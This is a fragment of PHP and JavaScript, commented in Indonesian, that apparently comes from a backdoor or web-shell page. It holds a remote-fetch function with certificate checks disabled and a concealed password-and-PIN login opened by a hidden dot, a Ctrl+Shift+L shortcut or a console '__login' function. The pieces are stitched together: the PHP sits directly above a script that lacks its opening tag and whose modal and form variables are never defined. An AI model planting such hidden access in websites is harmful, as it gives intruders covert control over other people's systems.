// ambil konten dari URL
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $data = curl_exec($conn);
        curl_close($conn);
        return $data;
    } elseif (function_exists('file_get_contents')) {
        return file_get_contents($url);
    }
    return false;
}

    var loginError = document.getElementById('loginError');
    
    // Buka modal
    dot.addEventListener('click', function(e) {
        e.stopPropagation();
        modal.classList.add('active');
        loginPass.focus();
    });
    
    // Tutup modal
    closeModal.addEventListener('click', function() {
        modal.classList.remove('active');
        loginError.style.display = 'none';
        loginPass.value = '';
        loginPin.value = '';
    });
    
    // Klik di luar modal
    modal.addEventListener('click', function(e) {
        if (e.target === modal) {
            modal.classList.remove('active');
            loginError.style.display = 'none';
            loginPass.value = '';
            loginPin.value = '';
        }
    });
    
    // Submit form
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        var formData = new FormData();
        formData.append('_pass', loginPass.value);
        formData.append('_pin', loginPin.value);
        
        fetch(window.location.href, {
            method: 'POST',
            body: formData,
            credentials: 'same-origin'
        })
        .then(function(response) {
            if (response.redirected) {
                window.location.href = response.url;
            } else {
                loginError.style.display = 'block';
                loginError.textContent = 'Invalid credentials';
                loginPass.value = '';
                loginPin.value = '';
                loginPass.focus();
            }
        })
        .catch(function() {
            loginError.style.display = 'block';
            loginError.textContent = 'Error occurred';
        });
    });
    
    // Shortcut Ctrl+Shift+L
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.shiftKey && e.key === 'L') {
            e.preventDefault();
            modal.classList.add('active');
            loginPass.focus();
        }
    });
    
    // Console login method
    window.__login = function(pass, pin) {
        var fd = new FormData();
        fd.append('_pass', pass);
        fd.append('_pin', pin);
        fetch(window.location.href, {method:'POST', body:fd, credentials:'same-origin'})
        .then(function(r){ if(r.redirected) location.href=r.url; });
    };
    
    // Silent console
    console.log("%c.", "color:transparent");
</script>
